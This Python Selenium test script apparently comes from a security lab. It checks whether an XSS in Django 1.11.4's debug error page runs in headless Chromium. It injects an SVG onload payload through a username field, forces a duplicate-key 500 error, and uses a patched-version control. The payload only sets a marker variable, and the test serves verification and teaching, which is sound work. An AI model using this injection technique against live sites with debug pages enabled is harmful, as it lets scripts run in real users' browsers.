"""Genuine browser test of technical-500 XSS, with a negative patched-version control."""
import os
import urllib.parse
import urllib.request
import urllib.error
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service

BASE = "http://target:8000"
mode = os.environ.get("TEST_MODE", "vulnerable")
options = Options()
options.binary_location = "/usr/bin/chromium-browser"
options.add_argument("--headless")
options.add_argument("--no-sandbox")  # CI-only, not target process
options.add_argument("--disable-dev-shm-usage")
driver = webdriver.Chrome(service=Service("/usr/bin/chromedriver"), options=options)
try:
    page = urllib.request.urlopen(BASE, timeout=15).read().decode()
    assert "Harbor Registry" in page and "/create_user/" in page
    print("PASS: learner discovers ordinary registration UI", flush=True)
    # Payload is within the original max_length=32 database constraint.
    handle = "<svg/onload=window.x=1>"
    url = BASE + "/create_user/?username=" + urllib.parse.quote(handle, safe="")
    first = urllib.request.urlopen(url, timeout=15)
    assert first.status == 200
    try:
        urllib.request.urlopen(url, timeout=15)
        raise AssertionError("duplicate key did not trigger a Django 500")
    except urllib.error.HTTPError as e:
        assert e.code == 500, e.code
        text = e.read().decode("utf-8", "replace")
        assert "IntegrityError" in text and "duplicate key" in text
        assert "django" in text.lower()
    print("PASS: actual PostgreSQL unique constraint -> Django technical 500", flush=True)
    driver.get(url)
    marker = driver.execute_script("return window.x || null")
    if mode == "vulnerable":
        assert marker == 1, "Django 1.11.4 XSS did not execute in Chromium: " + repr(marker)
        print("PASS: actual Django 1.11.4 error-page XSS executes JavaScript", flush=True)
    else:
        assert marker is None, "patched Django unexpectedly executed JavaScript"
        print("PASS: patched Django does not execute injected JavaScript", flush=True)
finally:
    driver.quit()
